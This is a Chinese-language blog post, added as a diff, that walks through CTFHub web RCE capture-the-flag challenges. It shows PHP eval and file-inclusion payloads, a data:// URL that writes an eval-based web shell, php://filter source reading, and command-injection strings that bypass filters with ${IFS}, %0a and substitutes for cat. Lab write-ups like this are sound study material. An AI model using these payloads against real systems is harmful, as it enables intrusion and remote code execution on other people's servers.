@@ -1,0 +1,199 @@
+---
+layout: post
+title: CTFHub Web RCE
+subtitle: CTFHub Web RCE
+date: 2023-07-02 17:13
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - CTFHub
+published: true
+number headings: first-level 2, max 4, 1.1., auto
+---
+
+## 1. RCE
+
+### 1.1. eval 执行
+
+![image](https://img.ghostliner.top/HxrYS3.png)
+
+传入 cmd 参数
+
+```php
+system("ls -lR / | grep flag");
+```
+
+![image](https://img.ghostliner.top/qNEyyj.png)
+
+```php
+system("find / -name flag_14104");
+```
+
+![image](https://img.ghostliner.top/9C8iWe.png)
+
+```php
+system("cat /flag_14104");
+```
+
+`ctfhub{d3eaaa2187eddb495ba02f6e}`
+
+### 1.2. 文件包含
+
+![image](https://img.ghostliner.top/jmFpp4.png)
+
+分析代码，GET 传 file 参数不能有“flag”字符，自带 shell.txt 文件
+
+```uri
+http://challenge-78e9fffaec2d5817.sandbox.ctfhub.com:10800/?file=shell.txt
+```
+
+蚁剑连接
+
+![image](https://img.ghostliner.top/xZi4Lq.png)
+
+### 1.3. php://input
+
+![image](https://img.ghostliner.top/VxOlc8.png)
+
+![image](https://img.ghostliner.top/AuRO1e.png)
+
+成功
+
+```php
+a=<?php system("ls /");?>
+a=<?php system("cat /flag_21991");?>
+```
+
+![image](https://img.ghostliner.top/21aV0j.png)
+
+### 1.4. 远程包含
+
+![image](https://img.ghostliner.top/ry5rgQ.png)
+
+```url
+http://challenge-057c54b0b096a464.sandbox.ctfhub.com:10800/?file=data://,<?php fputs(fopen('shell.php','w'),'123<?php eval($_POST["code"]);?>');
+```
+
+成功
+
+![image](https://img.ghostliner.top/EOIWV4.png)
+
+### 1.5. 读取源代码
+
+![image](https://img.ghostliner.top/XEYP2h.png)
+
+分析：file 参数以 `php://` 开头，存在 `/flag` 文件
+
+```url
+http://challenge-a8afd380d641eed1.sandbox.ctfhub.com:10800/?file=php://filter/resource=/flag
+```
+
+![image](https://img.ghostliner.top/AjZYM4.png)
+
+### 1.6. 命令注入
+
+```shell
+127.0.0.1|ls
+```
+
+![image](https://img.ghostliner.top/cKK2E9.png)
+
+```shell
+127.0.0.1|cat 262363244510708.php
+```
+
+![image](https://img.ghostliner.top/P6tAJ6.png)
+
+### 1.7. 过滤 cat
+
+**可以使用 tac、head、tail**
+
+`127.0.0.1|ls`
+
+![image](https://img.ghostliner.top/T8tX0v.png)
+
+`127.0.0.1|head flag_42519488108.php`
+
+![image](https://img.ghostliner.top/uMbovh.png)
+
+### 1.8. 过滤空格
+
+**可以使用 <、${IFS}**
+
+`127.0.0.1|ls`
+
+![image](https://img.ghostliner.top/rp3hlM.png)
+
+```url
+http://challenge-66d5d23f43cc02ba.sandbox.ctfhub.com:10800/?ip=127.0.0.1;cat<flag_35921562431926.php
+```
+
+![image](https://img.ghostliner.top/P1aFEZ.png)
+
+### 1.9. 过滤目录分隔符
+
+**多重命令执行，cd 到指定目录再 cat 内容**
+![image](https://img.ghostliner.top/VT5WHH.png)
+
+`127.0.0.1|cat flag_is_here` 无内容，`ls -l` 分析是目录
+
+![image](https://img.ghostliner.top/Yic2Pf.png)
+
+查看目录
+
+![image](https://img.ghostliner.top/t1lY7K.png)
+
+```url
+http://challenge-ccfac5e714299f03.sandbox.ctfhub.com:10800/?ip=127.0.0.1;cd flag_is_here;cat flag_27471845213010.php
+```
+
+![image](https://img.ghostliner.top/17za4S.png)
+
+### 1.10. 过滤运算符
+
+![image](https://img.ghostliner.top/FXaBnm.png)
+
+只过滤了 `|`、`&` ，未过滤 `;`
+
+`127.0.0.1|ls`
+
+![image](https://img.ghostliner.top/Jb0m05.png)
+
+`127.0.0.1;cat flag_69852691721920.php`
+
+![image](https://img.ghostliner.top/6ygJ0I.png)
+
+### 1.11. 综合过滤练习
+
+![image](https://img.ghostliner.top/sDdCQa.png)
+
+过滤了 `|`、`&`、`;`、` `、`/`、`cat`、`flag`、`ctfhub`
+
+```php
+127.0.0.1%0als
+```
+
+![image](https://img.ghostliner.top/stGyCh.png)
+
+```php
+127.0.0.1%0als${IFS}-R # ${IFS}代替空格ls -R
+```
+
+![image](https://img.ghostliner.top/uUGqij.png)
+
+```php
+127.0.0.1%0amv${IFS}fla*${IFS}fff%0als${IFS}-R #将文件夹flag改名为fff
+```
+
+![image](https://img.ghostliner.top/ORtTf5.png)
+
+![image](https://img.ghostliner.top/OtLqGW.png)
+
+flag 文件无权限改名
+
+```php
+127.0.0.1%0acd${IFS}fff%0agrep${IFS}"ctf"${IFS}*.php #使用grep搜索*.php文件避开关键字
+```
+
+![image](https://img.ghostliner.top/QyhraO.png)
